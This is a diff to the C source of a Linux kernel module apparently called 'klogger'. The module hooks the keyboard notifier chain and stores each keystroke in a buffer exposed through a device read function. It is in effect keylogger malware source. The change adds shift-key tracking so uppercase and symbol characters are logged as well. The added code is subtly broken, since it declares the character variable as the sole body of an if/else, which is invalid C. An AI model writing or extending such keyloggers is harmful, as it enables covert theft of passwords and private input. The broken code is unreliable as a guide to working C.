@@ -1,9 +1,10 @@
 /* Necessary includes for device drivers */
-
 #include <linux/kernel.h>
 #include <asm/uaccess.h>
 
 #include "klogger.h"
+
+static int shiftkey_On = 0;
 
 int klg_init(void) {
 	int result;
@@ -72,23 +73,37 @@ ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_po
 int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
 	struct keyboard_notifier_param *param = _param;
 
-	if(code == KBD_KEYCODE && param->down) {
-		if(param-> value == KEY_BACKSPACE) {
-			if(bptr != buffer) {
-				--bptr;
-				*bptr = '\0';
-			}
+	if (code == KBD_KEYCODE)
+	{
+		if (param->value == 42 || param->value == 54)
+		{
+			if(param->down) shiftkey_On = 1;
+			else shiftkey_On = 0;
+			return NOTIFY_OK;
 		}
-		else {
-			char ch = get_ascii(param->value);
-			if(ch != 'X') {
-				*bptr = ch;
-				bptr++;
-				if(bptr == endptr) bptr = buffer;
+		if (param->down)
+		{
+			if (param->value == KEY_BACKSPACE)
+			{
+				if (bptr != buffer) {
+					--bptr;
+					*bptr = '\0';
+				}
+			}
+			else 
+			{
+				if (shiftkey_On == 0)
+					char ch = get_ascii(param->value);
+				else
+					char ch = shifted_get_ascii(param->value);
+				if (ch != 'X') {
+					*bptr = ch;
+					bptr++;
+					if (bptr == endptr) bptr = buffer;
+				}
 			}
 		}
 	}
-
 	return NOTIFY_OK;
 }
 
